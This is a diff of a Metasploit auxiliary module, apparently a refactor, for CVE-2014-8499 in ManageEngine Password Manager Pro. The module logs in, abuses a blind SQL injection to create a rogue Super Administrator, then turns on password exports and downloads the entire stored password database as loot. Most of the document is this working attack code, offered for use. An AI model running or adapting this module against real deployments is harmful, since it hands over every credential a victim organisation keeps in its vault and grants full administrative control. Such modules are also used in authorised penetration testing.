@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -12,19 +12,18 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name' => 'ManageEngine Password Manager Pro Super Administrator Account Creation and Password DB Retrieval',
+      'Name' => 'ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection',
       'Description' => %q{
         ManageEngine Password Manager Pro (PMP) has an authenticated blind SQL injection
         vulnerability in SQLAdvancedALSearchResult.cc that can be abused to escalate
         privileges and obtain Super Administrator access. A Super Administrator can then
-        use its privileges to dump the whole password database in CSV format.
-        PMP can use both MySQL and PostgreSQL databases but this module only exploits the
-        latter as MySQL does not support stacked queries with Java.
-        PostgreSQL is the default database in v6.8 and above, but older PMP versions can
-        be upgraded and continue using MySQL, so a higher version does not guarantee
-        exploitability.
-        This module has been tested on v6.8 to v7.1 build 7104 on both Windows and Linux.
-        The vulnerability is fixed in v7.1 build 7105 and above.
+        use its privileges to dump the whole password database in CSV format. PMP can use
+        both MySQL and PostgreSQL databases but this module only exploits the latter as
+        MySQL does not support stacked queries with Java. PostgreSQL is the default database
+        in v6.8 and above, but older PMP versions can be upgraded and continue using MySQL,
+        so a higher version does not guarantee exploitability. This module has been tested
+        on v6.8 to v7.1 build 7104 on both Windows and Linux. The vulnerability is fixed in
+        v7.1 build 7105 and above.
       },
       'Author' =>
         [
@@ -34,7 +33,7 @@ class Metasploit3 < Msf::Auxiliary
       'References' =>
         [
           [ 'CVE', '2014-8499' ],
-          [ 'OSVDB', 'TODO' ],
+          #[ 'OSVDB', 'TODO' ],
           [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_pmp_privesc.txt' ],
           [ 'URL', 'http://seclists.org/fulldisclosure/2014/Nov/18' ]
         ],
@@ -42,14 +41,10 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptPort.new('RPORT',
-          [true, 'The target port', 7272]),
-        OptBool.new('SSL',
-          [true, 'Use SSL', true]),
-        OptString.new('USERNAME',
-          [true, 'The username to login as', 'guest']),
-        OptString.new('PASSWORD',
-          [true, 'Password for the specified username', 'guest']),
+        Opt::RPORT(7272),
+        OptBool.new('SSL', [true, 'Use SSL', true]),
+        OptString.new('USERNAME', [true, 'The username to login as', 'guest']),
+        OptString.new('PASSWORD', [true, 'Password for the specified username', 'guest']),
         OptString.new('TARGETURI', [ true,  "Password Manager Pro application URI", '/'])
       ], self.class)
   end
@@ -59,18 +54,18 @@ class Metasploit3 < Msf::Auxiliary
     # 1st step: we obtain a JSESSIONID cookie...
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri(datastore['TARGETURI'], 'PassTrixMain.cc')
+      'uri' => normalize_uri(target_uri.path, 'PassTrixMain.cc')
     })
 
-    if res and res.code == 200
+    if res && res.code == 200
       # 2nd step: we try to get the ORGN_NAME and AUTHRULE_NAME from the page (which is only needed for the MSP versions)
-      if res.body.to_s =~ /id="ORGN_NAME" name="ORGN_NAME" value="([\w]*)"/
+      if res.body && res.body.to_s =~ /id="ORGN_NAME" name="ORGN_NAME" value="([\w]*)"/
         orgn_name = $1
       else
         orgn_name = nil
       end
 
-      if res.body.to_s =~ /id="AUTHRULE_NAME" name="AUTHRULE_NAME" value="([\w]*)"/
+      if res.body && res.body.to_s =~ /id="AUTHRULE_NAME" name="AUTHRULE_NAME" value="([\w]*)"/
         authrule_name = $1
       else
         authrule_name = nil
@@ -80,7 +75,7 @@ class Metasploit3 < Msf::Auxiliary
       cookie = res.get_cookies
       res = send_request_cgi({
         'method' => 'POST',
-        'uri' => normalize_uri(datastore['TARGETURI'], 'login', 'AjaxResponse.jsp'),
+        'uri' => normalize_uri(target_uri.path, 'login', 'AjaxResponse.jsp'),
         'ctype' => "application/x-www-form-urlencoded",
         'cookie' => cookie,
         'vars_get' => {
@@ -88,7 +83,7 @@ class Metasploit3 < Msf::Auxiliary
           'userName' => username
         }
       })
-      if res and res.code == 200
+      if res && res.code == 200 && res.body
         domain_name = res.body.to_s.strip
       else
         domain_name = nil
@@ -107,19 +102,19 @@ class Metasploit3 < Msf::Auxiliary
 
       res = send_request_cgi({
         'method' => 'POST',
-        'uri' => normalize_uri(datastore['TARGETURI'], 'j_security_check;' + cookie.to_s.gsub(';','')),
+        'uri' => normalize_uri(target_uri.path, 'j_security_check;' + cookie.to_s.gsub(';','')),
         'ctype' => "application/x-www-form-urlencoded",
         'cookie' => cookie,
         'vars_post' => vars_post
       })
-      if res and res.code == 302
+      if res && res.code == 302
         res = send_request_cgi({
           'method' => 'GET',
-          'uri' => normalize_uri(datastore['TARGETURI'], 'PassTrixMain.cc'),
+          'uri' => normalize_uri(target_uri.path, 'PassTrixMain.cc'),
           'cookie' => cookie,
         })
 
-        if res and res.code == 200
+        if res && res.code == 200
           # 5th step: get the c ookies sent in the last response
           return res.get_cookies
         end
@@ -179,7 +174,7 @@ class Metasploit3 < Msf::Auxiliary
 
     res = send_request_cgi({
       'method'    => 'POST',
-      'uri'       => normalize_uri(datastore['TARGETURI'], "SQLAdvancedALSearchResult.cc"),
+      'uri'       => normalize_uri(target_uri.path, "SQLAdvancedALSearchResult.cc"),
       'cookie'    => @cookie,
       'vars_post'  => {
         'COUNT'          => Rex::Text.rand_text_numeric(2),
@@ -194,10 +189,10 @@ class Metasploit3 < Msf::Auxiliary
 
   def get_version
     res = send_request_cgi({
-                               'uri' => normalize_uri("PassTrixMain.cc"),
-                               'method' => 'GET'
-                           })
-    if res && res.code == 200 &&
+      'uri' => normalize_uri("PassTrixMain.cc"),
+      'method' => 'GET'
+    })
+    if res && res.code == 200 && res.body &&
         res.body.to_s =~ /ManageEngine Password Manager Pro/ &&
         (
           res.body.to_s =~ /login\.css\?([0-9]+)/ ||                            # PMP v6
@@ -225,10 +220,14 @@ class Metasploit3 < Msf::Auxiliary
 
 
   def run
+    unless check == Exploit::CheckCode::Appears
+      print_error("#{peer} - Fingerprint hasn't been successful, trying to exploit anyway...")
+    end
+
     version = get_version
     @cookie = login(datastore['USERNAME'], datastore['PASSWORD'])
     if @cookie == nil
-      fail_with(Failure::Unknown, "#{peer} - Failed to authenticate.")
+      fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate.")
     end
 
     creds = inject_sql(version < 7000 ? true : false)
@@ -237,81 +236,93 @@ class Metasploit3 < Msf::Auxiliary
     print_good("#{peer} - Created a new Super Administrator with username: #{username} | password: #{password}")
 
     cookie_su = login(username, password)
-    if cookie_su != nil
 
-      # 1st we turn on password exports
-      send_request_cgi({
-        'method' => 'POST',
-        'uri' => normalize_uri(datastore['TARGETURI'], 'ConfigureOffline.ve'),
-        'cookie' => cookie_su,
-        'vars_post'  => {
-          'IS_XLS'         => 'true',
-          'includePasswd'  => 'true',
-          'HOMETAB'        => 'true',
-          'RESTAB'         => 'true',
-          'RGTAB'          => 'true',
-          'PASSWD_RULE'    => 'Offline Password File',
-          'LOGOUT_TIME'    => '20'
-        }
-      })
+    if cookie_su.nil?
+      fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate as Super Administrator, account #{username} might not work.")
+    end
 
-      # now get the loot!
-      res = send_request_cgi({
-        'method' => 'GET',
-        'uri' => normalize_uri(datastore['TARGETURI'], 'jsp', 'xmlhttp', 'AjaxResponse.jsp'),
-        'cookie' => cookie_su,
-        'vars_get' => {
-          'RequestType' => 'ExportResources'
-        }
-      })
-      if res and res.code == 200 and res.body.to_s.length > 0
-        vprint_line(res.body.to_s)
-        print_good("#{peer} - Successfully exported password database from Password Manager Pro.")
-        loot_name     = 'manageengine.passwordmanagerpro.password.db'
-        loot_type     = 'text/csv'
-        loot_filename = 'manageengine_pmp_password_db.csv'
-        loot_desc     = 'ManageEngine Password Manager Pro Password DB'
-        p = store_loot(
+    print_status("#{peer} - Reporting Super Administrator credentials...")
+    report_super_admin_creds(username, password)
+
+    print_status("#{peer} - Leaking Password database...")
+    loot_passwords(cookie_su)
+  end
+
+  def report_super_admin_creds(username, password)
+    status = Metasploit::Model::Login::Status::SUCCESSFUL
+
+    service_data = {
+        address: rhost,
+        port: rport,
+        service_name: 'https',
+        protocol: 'tcp',
+        workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+        origin_type: :service,
+        module_fullname: self.fullname,
+        private_type: :password,
+        private_data: username,
+        username: password
+    }
+
+    credential_data.merge!(service_data)
+    credential_core = create_credential(credential_data)
+    login_data = {
+        core: credential_core,
+        access_level: 'Super Administrator',
+        status: status,
+        last_attempted_at: DateTime.now
+    }
+    login_data.merge!(service_data)
+    create_credential_login(login_data)
+  end
+
+  def loot_passwords(cookie_admin)
+    # 1st we turn on password exports
+    send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'ConfigureOffline.ve'),
+      'cookie' => cookie_admin,
+      'vars_post'  => {
+        'IS_XLS'         => 'true',
+        'includePasswd'  => 'true',
+        'HOMETAB'        => 'true',
+        'RESTAB'         => 'true',
+        'RGTAB'          => 'true',
+        'PASSWD_RULE'    => 'Offline Password File',
+        'LOGOUT_TIME'    => '20'
+      }
+    })
+
+    # now get the loot!
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'jsp', 'xmlhttp', 'AjaxResponse.jsp'),
+      'cookie' => cookie_admin,
+      'vars_get' => {
+        'RequestType' => 'ExportResources'
+      }
+    })
+
+    if res && res.code == 200 && res.body && res.body.to_s.length > 0
+      vprint_line(res.body.to_s)
+      print_good("#{peer} - Successfully exported password database from Password Manager Pro.")
+      loot_name     = 'manageengine.passwordmanagerpro.password.db'
+      loot_type     = 'text/csv'
+      loot_filename = 'manageengine_pmp_password_db.csv'
+      loot_desc     = 'ManageEngine Password Manager Pro Password DB'
+      p = store_loot(
           loot_name,
           loot_type,
           rhost,
           res.body,
           loot_filename,
           loot_desc)
-        print_status "Password database saved in: #{p}"
-      else
-        print_error("#{peer} - Failed to export Password Manager Pro passwords.")
-      end
-      status = Metasploit::Model::Login::Status::SUCCESSFUL
+      print_status("#{peer} - Password database saved in: #{p}")
     else
-      print_error("#{peer} - Failed to authenticate as Super Administrator, account #{username} might not work.")
-      status = Metasploit::Model::Login::Status::DENIED_ACCESS
+      print_error("#{peer} - Failed to export Password Manager Pro passwords.")
     end
-
-    service_data = {
-      address: rhost,
-      port: rport,
-      service_name: 'https',
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
-    }
-    credential_data = {
-      origin_type: :service,
-      module_fullname: self.fullname,
-      private_type: :password,
-      private_data: username,
-      username: password
-    }
-
-    credential_data.merge!(service_data)
-    credential_core = create_credential(credential_data)
-    login_data = {
-      core: credential_core,
-      access_level: 'Super Administrator',
-      status: status,
-      last_attempted_at: DateTime.now
-    }
-    login_data.merge!(service_data)
-    create_credential_login(login_data)
   end
 end
